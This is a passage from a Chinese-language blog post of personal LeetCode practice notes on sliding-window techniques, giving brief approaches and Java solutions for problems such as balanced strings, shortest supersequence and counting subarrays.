class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n - <span class="number">1</span> &amp;&amp; check(set, word, left, right + <span class="number">1</span>)) &#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(Set&lt;String&gt; set, String word, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        right++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Integer.max(left, right - <span class="number">10</span>); i &lt; right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set.contains(word.substring(i, right))) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>感觉自己边界控制能力提高了</p>
<h3 id="2968-执行操作使频率分数最大"><a href="#2968-执行操作使频率分数最大" class="headerlink" title="2968. 执行操作使频率分数最大"></a><a href="https://leetcode.cn/problems/apply-operations-to-maximize-frequency-score/">2968. 执行操作使频率分数最大</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先排序。</span><br></pre></td></tr></table></figure>



<h3 id="1763-最长的美好子字符串"><a href="#1763-最长的美好子字符串" class="headerlink" title="1763. 最长的美好子字符串"></a><a href="https://leetcode.cn/problems/longest-nice-substring/">1763. 最长的美好子字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这道题不像简单题啊，如果暴力那肯定简单。</span><br><span class="line">但滑窗做法，我都没看出来咋初始化咋能滑。。。。。</span><br></pre></td></tr></table></figure>





<h1 id="不定长滑动窗口（求最短-x2F-最小）"><a href="#不定长滑动窗口（求最短-x2F-最小）" class="headerlink" title="不定长滑动窗口（求最短&#x2F;最小）"></a>不定长滑动窗口（求最短&#x2F;最小）</h1><h3 id="1234-替换子串得到平衡字符串"><a href="#1234-替换子串得到平衡字符串" class="headerlink" title="1234. 替换子串得到平衡字符串"></a><a href="https://leetcode.cn/problems/replace-the-substring-for-balanced-string/">1234. 替换子串得到平衡字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口</span><br><span class="line">保证两个窗口外面的字符数量都小于等于n/4，在扩张时记录值。</span><br><span class="line">证明下能用滑动窗口：</span><br><span class="line">区间[l,r] 不满足条件时r不能右移动，l不能左移 因此能滑动</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">balancedString</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            map.merge(s.charAt(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(check(map, n/<span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; !check(map, n / <span class="number">4</span>)) &#123;</span><br><span class="line">                map.merge(s.charAt(right), -<span class="number">1</span>, Integer::sum);</span><br><span class="line">                right ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!check(map, n/<span class="number">4</span>)) <span class="keyword">break</span>;</span><br><span class="line">            res = Integer.min(res, right - left);</span><br><span class="line">            map.merge(s.charAt(left), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(Map&lt;Character, Integer&gt; map, <span class="type">int</span> maxVal)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.getOrDefault(<span class="string">&#x27;Q&#x27;</span>, <span class="number">0</span>) &lt;= maxVal &amp;&amp; map.getOrDefault(<span class="string">&#x27;W&#x27;</span>, <span class="number">0</span>) &lt;= maxVal &amp;&amp; map.getOrDefault(<span class="string">&#x27;E&#x27;</span>, <span class="number">0</span>) &lt;= maxVal &amp;&amp; map.getOrDefault(<span class="string">&#x27;R&#x27;</span>, <span class="number">0</span>) &lt;= maxVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1574-删除最短的子数组使剩余数组有序"><a href="#1574-删除最短的子数组使剩余数组有序" class="headerlink" title="1574. 删除最短的子数组使剩余数组有序"></a><a href="https://leetcode.cn/problems/shortest-subarray-to-be-removed-to-make-array-sorted/">1574. 删除最短的子数组使剩余数组有序</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双指针，先移动某边使得对于边有序。然后就可以双指针了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLengthOfShortestSubarray</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &gt; <span class="number">0</span> &amp;&amp; arr[right] &gt;= arr[right - <span class="number">1</span>]) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> right;</span><br><span class="line">        <span class="keyword">if</span> (right == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//此时arr[right -1 ] &gt; arr[right]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left == <span class="number">0</span> || arr[left] &gt;= arr[left - <span class="number">1</span>]; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; arr[left] &gt; arr[right]) &#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//删除的区间为[left + 1, right - 1]</span></span><br><span class="line">            res = Integer.min(res, right - left - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="面试题-17-18-最短超串"><a href="#面试题-17-18-最短超串" class="headerlink" title="面试题 17.18. 最短超串"></a><a href="https://leetcode.cn/problems/shortest-supersequence-lcci/">面试题 17.18. 最短超串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最简单类型的滑动窗口，固定左边，移动右边，在移左边就行</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] shortestSeq(<span class="type">int</span>[] big, <span class="type">int</span>[] small) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> big.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minLength</span> <span class="operator">=</span> n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; !check(map, small)) &#123;</span><br><span class="line">                map.merge(big[right++], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!check(map, small)) <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//区间[left, right)</span></span><br><span class="line">            <span class="keyword">if</span> (right - left &lt; minLength) &#123;</span><br><span class="line">                leftIndex = left;</span><br><span class="line">                minLength = right - left;</span><br><span class="line">            &#125;</span><br><span class="line">            map.merge(big[left], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (leftIndex == -<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;leftIndex, leftIndex + minLength - <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(Map&lt;Integer, Integer&gt; map, <span class="type">int</span>[] small)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; small.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.getOrDefault(small[i], <span class="number">0</span>) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以优化的地方，不用每次使用check，用一个find维护找到的变量数，长度等于数组长度说明没问题</p>
<h1 id="不定长滑动窗口（求子数组个数）"><a href="#不定长滑动窗口（求子数组个数）" class="headerlink" title="不定长滑动窗口（求子数组个数）"></a>不定长滑动窗口（求子数组个数）</h1><h3 id="2799-统计完全子数组的数目"><a href="#2799-统计完全子数组的数目" class="headerlink" title="2799. 统计完全子数组的数目"></a><a href="https://leetcode.cn/problems/count-complete-subarrays-in-an-array/">2799. 统计完全子数组的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口</span><br><span class="line">[l,r]固定l，移动r。刚好满足条件时方案为 n - r</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countCompleteSubarrays</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">find</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">need</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!map.containsKey(num)) &#123;</span><br><span class="line">                need++;</span><br><span class="line">                map.put(num, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; find &lt; need) &#123;</span><br><span class="line">                map.merge(nums[right], <span class="number">1</span>, Integer::sum);</span><br><span class="line">                <span class="keyword">if</span> (map.get(nums[right]) == <span class="number">1</span>) find++;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (need &gt; find) <span class="keyword">break</span>;</span><br><span class="line">            res += n - right + <span class="number">1</span>;</span><br><span class="line">            map.merge(nums[left], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (map.get(nums[left]) == <span class="number">0</span>) find--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1358-包含所有三种字符的子字符串数目"><a href="#1358-包含所有三种字符的子字符串数目" class="headerlink" title="1358. 包含所有三种字符的子字符串数目"></a><a href="https://leetcode.cn/problems/number-of-substrings-containing-all-three-characters/">1358. 包含所有三种字符的子字符串数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常规滑动题，都懒得写了。</span><br><span class="line">还是写下吧，提高熟练度</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfSubstrings</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">find</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; find &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                record[s.charAt(right) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">                <span class="keyword">if</span> (record[s.charAt(right) - <span class="string">&#x27;a&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                    find++;</span><br><span class="line">                &#125;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(find != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">            res += n - right + <span class="number">1</span>;</span><br><span class="line">            record[s.charAt(left) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">            <span class="keyword">if</span>(record[s.charAt(left) - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>) find--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2962-统计最大元素出现至少-K-次的子数组"><a href="#2962-统计最大元素出现至少-K-次的子数组" class="headerlink" title="2962. 统计最大元素出现至少 K 次的子数组"></a><a href="https://leetcode.cn/problems/count-subarrays-where-max-element-appears-at-least-k-times/">2962. 统计最大元素出现至少 K 次的子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常规滑动窗口。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countSubarrays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> Arrays.stream(nums).max().getAsInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curMaxCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; curMaxCount &lt; k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[right] == maxVal) curMaxCount++;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curMaxCount &lt; k) <span class="keyword">break</span>;</span><br><span class="line">            res += n - right + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[left] == maxVal) curMaxCount--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2302-统计得分小于-K-的子数组数目"><a href="#2302-统计得分小于-K-的子数组数目" class="headerlink" title="2302. 统计得分小于 K 的子数组数目"></a><a href="https://leetcode.cn/problems/count-subarrays-with-score-less-than-k/">2302. 统计得分小于 K 的子数组数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两种方法</span><br><span class="line">1、left =0 , right = n -1</span><br><span class="line">right 缩小到 k 刚好满足条件</span><br><span class="line">此后固定left 右移right 计算方案数</span><br><span class="line">2、逆向思维。易得总方案数为 n + n*(n-1)/2</span><br><span class="line">求大于等于K的方案数，然后相减</span><br><span class="line">第二种方法简单点，写第二种了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countSubarrays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">long</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">totCount</span> <span class="operator">=</span> n + (<span class="type">long</span>) n * (n - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">revCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//[left,right)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; score &lt; k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(right == left) score = nums[right];</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    score /= (right - left);</span><br><span class="line">                    score += nums[right];</span><br><span class="line">                    score *= (right - left + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(score &lt; k) <span class="keyword">break</span>;</span><br><span class="line">            revCount += n - right + <span class="number">1</span>;</span><br><span class="line">            score /= (right - left );<span class="comment">//k &gt;=1 这里能保证right - left != 0</span></span><br><span class="line">            score -= nums[left];</span><br><span class="line">            score *= (right - left - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> totCount - revCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题总结、</p>
<p>这道题思维量不大，但是一些corner case比较麻烦。</p>
<p>总结下，一来就要定义好left,right表示什么含义，以及需要确保初始分数，跟你初始化的left、right值及其定义相对应，理解好了就很快写出来了</p>
<h3 id="2537-统计好子数组的数目"><a href="#2537-统计好子数组的数目" class="headerlink" title="2537. 统计好子数组的数目"></a><a href="https://leetcode.cn/problems/count-the-number-of-good-subarrays/">2537. 统计好子数组的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于这种子数组主要是找到数目关系以及移动后的数目关系</span><br><span class="line">还是比较简单，直接贴代码</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countGood</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//[left, right)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(right &lt; n &amp;&amp; score &lt; k)&#123;</span><br><span class="line">                <span class="comment">// n - 1 -&gt; (n-1)*(n-2)/2</span></span><br><span class="line">                <span class="comment">// n - &gt; n*(n-1)/2</span></span><br><span class="line">                <span class="comment">//0 0 1 3 6</span></span><br><span class="line">                <span class="comment">/// 做差 （n - 1)</span></span><br><span class="line">                map.merge(nums[right], <span class="number">1</span>, Integer::sum);</span><br><span class="line">                <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> map.get(nums[right]);</span><br><span class="line">                <span class="keyword">if</span>(count &gt;= <span class="number">2</span>)&#123;</span><br><span class="line">                    score += count - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(score &lt; k) <span class="keyword">break</span>;</span><br><span class="line">            res += n - right + <span class="number">1</span>;</span><br><span class="line">            map.merge(nums[left], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> map.get(nums[left]);</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= <span class="number">1</span>) score -= count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2762-不间断子数组"><a href="#2762-不间断子数组" class="headerlink" title="2762. 不间断子数组"></a><a href="https://leetcode.cn/problems/continuous-subarrays/">2762. 不间断子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也很简单，对于子数组使用TreeSet维护最大值、最小值即可</span><br><span class="line">然后开滑</span><br><span class="line">（也可以用单调队列，[1438. 绝对差不超过限制的最长连续子数组]用了单调队列，这里就不用了）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">continuousSubarrays</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        TreeMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right &lt; n &amp;&amp; (map.isEmpty() || map.lastKey() - map.firstKey() &lt;= <span class="number">2</span>)) &#123;</span><br><span class="line">                map.merge(nums[right], <span class="number">1</span>, Integer::sum);</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (map.lastKey() - map.firstKey() &lt;= <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">            res += n - right + <span class="number">1</span>;</span><br><span class="line">            map.merge(nums[left], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (map.get(nums[left]) == <span class="number">0</span>) map.remove(nums[left]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n + (<span class="type">long</span>) n * (n - <span class="number">1</span>)/<span class="number">2</span> - res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="多指针滑动窗口"><a href="#多指针滑动窗口" class="headerlink" title="多指针滑动窗口"></a>多指针滑动窗口</h1><h3 id="1248-统计「优美子数组」"><a href="#1248-统计「优美子数组」" class="headerlink" title="1248. 统计「优美子数组」"></a><a href="https://leetcode.cn/problems/count-number-of-nice-subarrays/">1248. 统计「优美子数组」</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多指针滑动窗口</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfSubarrays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cnt1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cnt2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//[left, right1)</span></span><br><span class="line">        <span class="comment">//[left, right2)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt; n; left++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (right1 &lt; n &amp;&amp; cnt1 &lt; k) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((nums[right1++] &amp; <span class="number">1</span>) == <span class="number">1</span>) cnt1++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (right2 &lt; n &amp;&amp; cnt2 &lt;= k) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((nums[right2++] &amp; <span class="number">1</span>) == <span class="number">1</span>) cnt2++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt1 &lt; k) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span>(cnt2 == k) res += n - right1 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> res += right2 - right1;</span><br><span class="line">            <span class="keyword">if</span> ((nums[left] &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                cnt1--;</span><br><span class="line">                cnt2--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意点</p>
